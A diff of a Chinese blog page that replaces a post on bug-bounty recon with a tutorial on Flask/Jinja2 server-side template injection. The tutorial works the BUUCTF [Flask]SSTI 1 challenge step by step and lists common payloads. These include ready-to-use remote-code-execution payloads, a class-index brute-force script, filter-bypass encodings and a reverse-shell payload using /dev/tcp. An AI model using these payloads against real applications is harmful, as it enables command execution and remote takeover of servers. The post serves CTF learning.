@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SRC漏洞挖掘学习, xmhhmx的blog">
+    <meta name="keywords" content="SSTI模板注入, xmhhmx的blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SRC漏洞挖掘学习 | xmhhmx的blog</title>
+    <title>SSTI模板注入 | xmhhmx的blog</title>
     <link rel="icon" type="image/png" href="/medias/%E5%A4%A9%E7%A7%A4%E5%BA%A7.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -183,12 +183,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SRC漏洞挖掘学习</h1>
+                    <h1 class="description center-align post-title">SSTI模板注入</h1>
                 </div>
             </div>
         </div>
@@ -198,129 +198,22 @@
 
 
 
-<main class="post-container content">
+<main class="container content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        padding: 35px 0 15px 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        padding-bottom: 30px;
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
+    <!-- 文章内容详情 -->
 <div id="artDetail">
     <div class="card">
         <div class="card-content article-info">
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
-                                <span class="chip bg-color">SRC漏洞挖掘</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
-                                安全
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -329,21 +222,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2024-08-29
+                    2025-06-08
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2024-08-30
+                    2025-06-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    267
+                    1.1k
                 </div>
                 
 
@@ -363,38 +256,97 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SRC漏洞挖掘学习"><a href="#SRC漏洞挖掘学习" class="headerlink" title="SRC漏洞挖掘学习"></a>SRC漏洞挖掘学习</h1><h2 id="JS漏洞挖掘"><a href="#JS漏洞挖掘" class="headerlink" title="JS漏洞挖掘"></a>JS漏洞挖掘</h2><blockquote>
-<p>实战中阅读JS的作用</p>
+                <h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>SSTI，即服务器端模板注入，是一种特定的安全漏洞。其原理和特点主要包括以下几点：</p>
+<p>模板引擎机制：模板引擎的作用是将动态数据与静态模板结合生成最终的输出内容。它们通过替换指定<br>的标签或执行某些代码片段来实现这一过程。</p>
+<p>用户输入处理：当构建这些模板时，如果服务端未对用户输入进行正确的过滤和转义，恶意用户可能会<br>插入一些特殊的代码片段。这些代码片段在模板引擎渲染过程中被执行，可能导致不安全的代码或命令<br>被执行。</p>
+<p>注入的本质：就像SQL注入允许攻击者通过构造特殊的输入来干预数据库查询一样，<strong>SSTI允许攻击者干</strong><br><strong>预模板渲染的过程</strong>。这可以导致敏感信息泄露、远程代码执行等严重后果。</p>
+<h2 id="快速判断框架"><a href="#快速判断框架" class="headerlink" title="快速判断框架"></a>快速判断框架</h2><img src="https://pic1.imgdb.cn/item/68452b4d58cb8da5c839e2d3.png" style="zoom: 50%;">
+
+<h2 id="Payload基础"><a href="#Payload基础" class="headerlink" title="Payload基础"></a>Payload基础</h2><blockquote>
+<p>__class__:查找当前类型的所属对象，作用相当于type()，用来获取类的类型</p>
 </blockquote>
-<ol>
-<li><p>JS中存在插件名字，根据插件找到相应的漏洞直接利用</p>
-<ul>
-<li>某些公司直接利用第三方存在漏洞的的JS代码</li>
-</ul>
-<p> <img src="https://pic.imgdb.cn/item/66cfcc44d9c307b7e95cfc4c.png"></p>
-</li>
-<li><p>JS中存在一些URL链接，根据URL链接找到相应的页面进一步测试和利用</p>
-</li>
-</ol>
-<p><img src="https://pic.imgdb.cn/item/66cfccd5d9c307b7e95d5e0e.png"></p>
-<ol start="3">
-<li>JS中存在一个子域名，可以直接访问子域名</li>
-</ol>
-<p><img src="https://pic.imgdb.cn/item/66cfcd20d9c307b7e95da2b6.png"></p>
-<ol start="4">
-<li>JS中的一些注释可能泄露以账号密码或者其他的</li>
-</ol>
-<h3 id="浏览器控制台使用技巧及方法"><a href="#浏览器控制台使用技巧及方法" class="headerlink" title="浏览器控制台使用技巧及方法"></a>浏览器控制台使用技巧及方法</h3><p><img src="https://pic.imgdb.cn/item/66cfd27ad9c307b7e96164f0.png"></p>
-<h3 id="JS断点技巧以及Hook注入"><a href="#JS断点技巧以及Hook注入" class="headerlink" title="JS断点技巧以及Hook注入"></a>JS断点技巧以及Hook注入</h3><blockquote>
-<p>找到关键代码，打上断点，步进查看加密过程</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"a"</span>.__class__</span><br><span class="line">输出：</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>__base__、__bases__:用来获取类的直接父类，前者只能获取一个父类，后者可以获取所有直接父类</p>
 </blockquote>
-<p><img src="https://pic.imgdb.cn/item/66cfd3edd9c307b7e9626ad7.png"></p>
-<h3 id="Python和JS结合解决加密难题"><a href="#Python和JS结合解决加密难题" class="headerlink" title="Python和JS结合解决加密难题"></a>Python和JS结合解决加密难题</h3><p><img src="https://pic.imgdb.cn/item/66cfd711d9c307b7e9674b01.png"></p>
-<h3 id="实战MD5加密逆向加密参数还原"><a href="#实战MD5加密逆向加密参数还原" class="headerlink" title="实战MD5加密逆向加密参数还原"></a>实战MD5加密逆向加密参数还原</h3><h2 id="FUZZ（模糊测试）"><a href="#FUZZ（模糊测试）" class="headerlink" title="FUZZ（模糊测试）"></a>FUZZ（模糊测试）</h2><h3 id="常见的FUZZ姿势、工具及字典"><a href="#常见的FUZZ姿势、工具及字典" class="headerlink" title="常见的FUZZ姿势、工具及字典"></a>常见的FUZZ姿势、工具及字典</h3><h3 id="未知目录，信息泄露，备份文件等漏洞的FUZZ"><a href="#未知目录，信息泄露，备份文件等漏洞的FUZZ" class="headerlink" title="未知目录，信息泄露，备份文件等漏洞的FUZZ"></a>未知目录，信息泄露，备份文件等漏洞的FUZZ</h3><blockquote>
-<p>用bp，先FUZZ文件，再FUZZ目录</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(test1,test2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">asd = A()</span><br><span class="line"><span class="built_in">print</span>(asd.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(asd.__class__.__bases__)</span><br><span class="line">输出：</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'__main__.test1'</span>&gt;</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">'__main__.test1'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.test2'</span>&gt;)</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>__subclasses__:查找父类下的所有子类，后加中括号内可以填写具体哪一个子类的索引</p>
 </blockquote>
-<p>需要拥有一个顺手的文件名字典和目录字典</p>
-<h3 id="弱口令，隐藏变量，未知参数的FUZZ"><a href="#弱口令，隐藏变量，未知参数的FUZZ" class="headerlink" title="弱口令，隐藏变量，未知参数的FUZZ"></a>弱口令，隐藏变量，未知参数的FUZZ</h3>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(test1,test2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">asd = A()</span><br><span class="line"><span class="built_in">print</span>(test1.__subclasses__())</span><br><span class="line">输出：</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">'__main__.A'</span>&gt;]</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>__name__:可以用来查看类的名称</p>
+</blockquote>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(test1,test2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">asd = A()</span><br><span class="line"><span class="built_in">print</span>(asd.__class__.__name__)</span><br><span class="line">输出：</span><br><span class="line">A</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>__global__:以字典形式返回函数所在模块命名空间中所有变量</p>
+</blockquote>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hz</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">asd</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(hz.__globals__)</span><br><span class="line">输出：</span><br><span class="line">{<span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x000001580F70D1D1</span>&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>, <span class="string">'__annotations__'</span>: {}, <span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__file__'</span>: <span class="string">'Z:\\Users\\IAX123\\Desktop\\python学习\\1.py'</span>, <span class="string">'__cached__'</span>: <span class="literal">None</span>, <span class="string">'hz'</span>: &lt;function hz at <span class="number">0x000001580F5C04A0</span>&gt;, <span class="string">'test'</span>: &lt;<span class="keyword">class</span> <span class="string">'__main__.test'</span>&gt;}</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>__mro__:和base的效果一致，但是这个是显示查找当前类的所有继承类</p>
+</blockquote>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(test1,test2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">asd = A()</span><br><span class="line"><span class="built_in">print</span>(asd.__class__.__mro__)</span><br><span class="line">输出:</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">'__main__.A'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.test1'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.test2'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'object'</span>&gt;)</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>题目：BUUCTF-[Flask]SSTI 1</p>
+<p>1、打开</p>
+<p><img src="https://pic1.imgdb.cn/item/68453cfa58cb8da5c83a0f04.png"></p>
+<p>2、FUZZ出参数为name</p>
+<p>3、发现存在ssti注入</p>
+<img src="https://pic1.imgdb.cn/item/68453d3558cb8da5c83a0f1e.png" style="zoom:67%;">
+
+<p>4、构造payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先获取类:</span><br><span class="line">{{''.__class__}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/68469bfb58cb8da5c83dbcb6.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取基类:</span><br><span class="line">{{''.__class__.__bases__}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/68469c2a58cb8da5c83dbdb0.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取基类的所有子类:</span><br><span class="line">{{''.__class__.__base__.__subclasses__()}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/68469c6758cb8da5c83dbf64.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在子类中找到存在eval函数的类，此处找到catch_warnings这个类，位于第167个类，但是下标从0开始就是166</span><br><span class="line">{{''.__class__.__base__.__subclasses__()[166]}}</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>附上一个脚本，查找是第几个类：</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">233</span>)):</span><br><span class="line">    url = <span class="string">'http://node5.buuoj.cn:26198/?name={{"".__class__.__base__.__subclasses__()['</span>+<span class="built_in">str</span>(i)+<span class="string">']}}'</span></span><br><span class="line">    r= requests.get(url=url).text</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'warnings.catch_warnings'</span> <span class="keyword">in</span> r):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></tbody></table></figure>
+</blockquote>
+<p><img src="https://pic1.imgdb.cn/item/68469c9858cb8da5c83dc0c5.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在这个类中找他的初始化函数里面的所有全局变量,然后看看这里面有没有危险函数eval:</span><br><span class="line">{{''.__class__.__base__.__subclasses__()[166].__init__.__globals__}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/68469cdd58cb8da5c83dc2b8.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过找{，{的前面就是键，对应的值中存在eval函数：['__builtins__']['eval']</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/68469d8e58cb8da5c83dc7c3.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">代码执行：eval('__import__("os").popen("env").read()')</span><br><span class="line">{{''.__class__.__base__.__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("env").read()')}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/68469e4d58cb8da5c83dcfb0.png"></p>
+<p>官方payload：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__("os").popen("env").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>另一种方式：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找os._wrap_close类，其中的popen函数</span><br><span class="line">{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]("env").read()}}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="常见payload分析"><a href="#常见payload分析" class="headerlink" title="常见payload分析"></a>常见payload分析</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">{{[].__class__.__base__.__subclasses__()}}</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func__globals.values()[13]['eval']('__import__("os").popen("ls").read()')</span><br><span class="line"></span><br><span class="line">__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')</span><br><span class="line"></span><br><span class="line">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings'</span><br><span class="line">%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('&lt;command&gt;').read()") }}{% endif %}{% endfor %}</span><br><span class="line"></span><br><span class="line">".__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i &gt;&amp; /dev/tcp/你的服务器地址/端口 0&gt;&amp;1').read()</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="通用payload"><a href="#通用payload" class="headerlink" title="通用payload"></a>通用payload</h2><p>lipsum是jinja2的内置全局变量，jinja2一共有3个内置的全局函数：range、lipsum、dict,其中只有lipsum有__globals__键，其他两个要逃肯定逃得出来，但是payload构造就要花点功夫了。除此之外，flask也提供了两个内置的全局函数：url_for、getflashed_messages，两个都有__globals__键</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{lipsum.__globals__.get('os').popen("cat flag2.txt").read()}}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、过滤了''  --&gt;  使用" "</span><br><span class="line">2、过滤了_   --&gt;  使用\x5f		//十六机制</span><br><span class="line">3、过滤了.   --&gt;  使用[]</span><br><span class="line">原本为''.__class__.__base__    --&gt;   ()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]</span><br><span class="line"></span><br><span class="line">{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("nl app*")["read"]()}}</span><br></pre></td></tr></tbody></table></figure>
+
+
                 
             </div>
             <hr/>
@@ -420,7 +372,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2024/08/29/src-lou-dong-wa-jue-xue-xi/">http://example.com/2024/08/29/src-lou-dong-wa-jue-xue-xi/</a>
+                    <a href="http://example.com/2025/06/08/ssti-mo-ban-zhu-ru/">http://example.com/2025/06/08/ssti-mo-ban-zhu-ru/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -457,11 +409,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
-                                    <span class="chip bg-color">SRC漏洞挖掘</span>
-                                </a>
-                            
+                            <span class="chip bg-color">No tag</span>
                         </div>
                     
                 </div>
@@ -629,54 +577,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2024/08/30/shen-tou-shi-zhan-xue-xi-si-lu/">
+                <a href="/2025/06/08/ssti-mo-ban-zhu-ru/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="渗透实战学习思路">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="SSTI模板注入">
                         
-                        <span class="card-title">渗透实战学习思路</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-08-30
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            XMH
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2024/08/21/php-fan-xu-lie-hua/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="PHP反序列化">
-                        
-                        <span class="card-title">PHP反序列化</span>
+                        <span class="card-title">SSTI模板注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -687,27 +599,53 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-08-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-06-08
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
-                                    Web安全
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            XMH
                             
                         </span>
                     </div>
                 </div>
+
                 
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                        <span class="chip bg-color">PHP反序列化</span>
-                    </a>
-                    
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/06/03/di-er-jie-parloo-bei-ying-ji-xiang-ying/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="第二届Parloo杯应急响应">
+                        
+                        <span class="card-title">第二届Parloo杯应急响应</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-06-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            XMH
+                            
+                        </span>
+                    </div>
                 </div>
                 
             </div>
@@ -774,100 +712,6 @@
 
 <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget card" style="background-color: white;">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
